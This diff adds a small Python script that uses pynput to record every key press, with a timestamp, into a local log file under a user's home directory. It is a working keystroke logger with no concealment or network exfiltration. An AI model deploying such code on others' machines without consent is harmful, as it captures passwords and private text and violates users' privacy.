@@ -1,0 +1,30 @@
+#!/usr/bin/env python3.7
+from pynput import keyboard
+import time
+
+#set the reference of the log file
+OUTPUT = "/home/ken/script/log/Keyboard.log"
+def on_press(key):
+    try:
+        R_key = time.asctime()+" "+'alphanumeric key {0} pressed'.format(
+            key.char)
+    except AttributeError:
+        R_key = time.asctime()+" "+'special key {0} pressed'.format(
+            key)
+    R_key=R_key+"\n"  
+    with open(OUTPUT, 'a') as f:
+      f.write(R_key)
+
+#def on_release(key):
+#    print('{0} released'.format(
+#        key))
+#    if key == keyboard.Key.esc:
+#        # Stop listener
+#        return False
+
+# Collect events until released
+with keyboard.Listener(
+        on_press=on_press,
+#        on_release=on_release
+        ) as listener:
+    listener.join()
